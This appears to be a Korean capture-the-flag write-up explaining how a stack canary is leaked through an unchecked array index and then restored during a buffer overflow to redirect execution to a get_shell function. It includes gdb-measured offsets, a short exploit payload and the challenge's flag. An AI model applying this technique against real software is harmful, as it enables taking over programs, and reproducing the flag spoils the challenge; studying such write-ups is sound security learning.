카나리가 걸려 있어도 값이 새면 무력화된다는 걸 직접 확인한 문제입니다. 개념은 [스택 카나리 정리](/posts/concept-stack-canary/)에 따로 적어 뒀습니다.

## 보호기법과 구조

```text
Arch:  i386-32-little
Stack: Canary found     ← BOF 전에 카나리를 알아내야 함
NX:    enabled          ← 쉘코드 불가, 기존 get_shell 재사용
PIE:   No PIE           ← get_shell 주소 고정 (0x080486b9)
```

메뉴가 세 개입니다. `F`로 `box`를 채우고, `P`로 `box[idx]`를 출력하고, `E`로 `name`을 입력받습니다. 핵심은 두 곳입니다.

- `P`: `print_box(box, idx)`가 `idx`를 범위 검사 없이 `box[idx]`로 접근합니다. OOB read입니다.
- `E`: `read(0, name, name_len)`에서 `name`은 0x40뿐인데 `name_len`을 사용자가 정합니다. BOF입니다.

## 취약점을 엮는 순서

OOB read로 스택에 있는 카나리를 1바이트씩 읽고, 그다음 BOF로 넘치되 읽어 둔 카나리를 제자리에 복원하면서 반환 주소를 `get_shell`로 덮습니다.

## 오프셋은 gdb로 실측

디스어셈블과 gdb 런타임 값이 정확히 맞았습니다. 추측하지 않았습니다.

| 기준 | box 오프셋 | name 오프셋 |
| --- | --- | --- |
| canary | +128 | +64 |
| return address | +140 | +76 |

`box[128]`이 카나리의 최하위 바이트인데, glibc 카나리라 항상 `0x00`입니다.

## 익스플로잇

먼저 `P`로 `box[128..131]`을 읽어 카나리 4바이트를 조립합니다. 그다음 `name` 기준으로 페이로드를 맞춥니다.

```python
payload  = b"A" * 64        # name[0:64]
payload += p32(canary)      # name[64:68] 카나리 복원
payload += b"B" * 8         # saved edi + ebp
payload += p32(get_shell)   # name[76:80] 반환 주소
```

`name_len`을 80으로 주고 보내면 `return 0`에서 카나리 검사를 통과하고, `get_shell`이 실행되면서 `system("/bin/sh")`가 뜹니다.

로컬에서 셸을 확인한 뒤 리모트에서 플래그를 받았습니다.

```text
DH{00c609773822372daf2b7ef9adbdb824}
```

## 한 줄 정리

카나리가 있어도 OOB read로 흘려 버리면 SSP는 무력화되고, 길이 무검증 read로 카나리만 제자리에 복원하면 ret2win이 그대로 성립합니다.
